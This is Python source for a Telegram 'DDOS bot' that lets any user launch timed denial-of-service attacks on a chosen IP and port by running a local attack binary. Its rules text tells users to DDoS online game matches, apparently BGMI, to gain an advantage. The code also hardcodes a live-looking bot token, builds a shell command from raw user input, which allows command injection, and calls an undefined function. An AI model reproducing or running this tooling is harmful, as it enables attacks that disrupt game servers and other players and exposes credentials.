import os
import telebot
import logging
import time
import asyncio
from datetime import datetime
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
from threading import Thread

TOKEN = '8587245206:AAGQ9dtS-oLdxh57lAUraWlttUqRCInBWC0'
CHANNEL_ID = -1003483511711

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

bot = telebot.TeleBot(TOKEN)

loop = asyncio.get_event_loop()

REQUEST_INTERVAL = 1
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]
running_processes = []


# --------------------  ATTACK FUNCTION  --------------------
async def run_attack_command_async(target_ip, target_port, duration, chat_id, username, start_msg_id):
    max_duration = 420
    duration = min(int(duration), max_duration)

    command = f"./m {target_ip} {target_port} {duration}"

    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        running_processes.append(process)

        await asyncio.sleep(duration)

        # Delete "attack started" message
        bot.delete_message(chat_id, start_msg_id)

        # Send finished attack message
        finished_msg = bot.send_message(
            chat_id,
            f"*✅ Attack Finished Successfully!*\n\n"
            f"🎯 **Target:** {target_ip}:{target_port}\n"
            f"⏳ **Duration:** {duration} sec\n"
            f"👤 **By:** @{username}",
            parse_mode="Markdown"
        )

        await asyncio.sleep(15)
        bot.delete_message(chat_id, finished_msg.message_id)

    except Exception as e:
        logging.error(f"Error executing attack: {e}")

    finally:
        if process in running_processes:
            running_processes.remove(process)


async def start_asyncio_loop():
    while True:
        await asyncio.sleep(REQUEST_INTERVAL)


# --------------------  ATTACK COMMAND  --------------------
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    try:
        bot.send_message(
            message.chat.id,
            "*Send the attack details:\n\n`<IP> <Port> <Duration>`*",
            parse_mode='Markdown'
        )
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Attack command error: {e}")


def process_attack_command(message):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(message.chat.id, "*❌ Invalid Format*\nUse: `<IP> <Port> <Duration>`", parse_mode="Markdown")
            return

        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(message.chat.id, f"*❌ Port {target_port} is blocked.*", parse_mode="Markdown")
            return

        if int(duration) > 420:
            bot.send_message(message.chat.id, "*❌ Max duration is 420 seconds*", parse_mode="Markdown")
            return

        username = message.from_user.username

        start_msg = bot.send_message(
            message.chat.id,
            f"*🚀 Attack Started!*\n\n"
            f"🎯 **Target:** {target_ip}:{target_port}\n"
            f"⏳ **Duration:** {duration} sec\n"
            f"👤 **By:** @{username}",
            parse_mode="Markdown"
        )

        asyncio.run_coroutine_threadsafe(
            run_attack_command_async(target_ip, target_port, duration, message.chat.id, username, start_msg.message_id),
            loop
        )

    except Exception as e:
        logging.error(f"Error in attack process: {e}")


# --------------------  UI BUTTONS + START  --------------------
@bot.message_handler(commands=['start'])
def send_welcome(message):
    markup = ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)

    btn1 = KeyboardButton("Attack 🚀")
    btn2 = KeyboardButton("Rules 🔰")
    btn3 = KeyboardButton("My Info ℹ️")

    markup.add(btn1, btn2, btn3)

    bot.send_message(
        message.chat.id,
        "*🔆 WELCOME TO VIP ARNAV DDOS BOT 🔆*\n\nEveryone is approved ✔️",
        reply_markup=markup,
        parse_mode='Markdown'
    )


# --------------------  BUTTON HANDLER  --------------------
@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "Attack 🚀":
        attack_command(message)

    elif message.text == "Rules 🔰":
        bot.send_message(
            message.chat.id,
            "*🔰 RULES 🔰*\n\n"
            "1. Do DDOS in 3 match then normal 2 match.\n"
            "2. Keep kills < 80.\n"
            "3. Don't spam attacks.\n"
            "4. Don't run 2 attacks at once.\n"
            "5. Clear cache after few matches.",
            parse_mode="Markdown"
        )

    elif message.text == "My Info ℹ️":
        username = message.from_user.username
        user_id = message.from_user.id
        bot.send_message(
            message.chat.id,
            f"*USERNAME:* @{username}\n"
            f"*USER ID:* {user_id}\n"
            f"*ACCESS:* ✔️ Everyone Approved\n"
            f"*METHOD:* bgmi ddos",
            parse_mode="Markdown"
        )

    else:
        bot.reply_to(message, "*Invalid option*", parse_mode="Markdown")


# --------------------  START BOT  --------------------
if __name__ == "__main__":
    asyncio_thread = Thread(target=start_asyncio_thread, daemon=True)
    asyncio_thread.start()

    logging.info("Starting bot...")
    while True:
        try:
            bot.polling(none_stop=True)
        except Exception as e:
            logging.error(f"Bot polling error: {e}")
        time.sleep(REQUEST_INTERVAL)
